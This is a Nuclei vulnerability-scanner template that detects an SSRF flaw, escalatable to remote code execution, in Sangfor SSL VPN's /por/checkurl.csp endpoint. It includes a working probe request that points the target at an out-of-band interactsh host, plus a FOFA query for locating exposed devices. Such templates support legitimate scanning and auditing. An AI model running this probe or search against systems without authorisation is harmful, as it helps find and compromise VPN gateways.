id: sangfor-sslvpn-rce

info:
  name: Sangfor SSL VPN RCE Detection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Sangfor SSL VPN contains a remote code execution vulnerability via the /por/checkurl.csp endpoint. The url parameter is vulnerable to SSRF which can be escalated to RCE. This template uses interactsh for OOB verification.
  reference:
    - https://github.com/lianqingsec/NucleiPocGather
  classification:
    cwe-id: CWE-918
  metadata:
    max-request: 2
    fofa-query: app="SANGFOR-SSL-VPN"
  tags: sangfor,sslvpn,rce,ssrf,oob

http:
  - id: r0
    method: GET
    path:
      - "{{BaseURL}}/por/checkurl.csp"
    redirects: false

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "2"

  - id: r1
    method: GET
    path:
      - "{{BaseURL}}/por/checkurl.csp?url=http://{{interactsh-url}}&retry=0&timeout=1"
    redirects: false

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "0"

      - type: word
        part: interactsh_protocol
        words:
          - "dns"
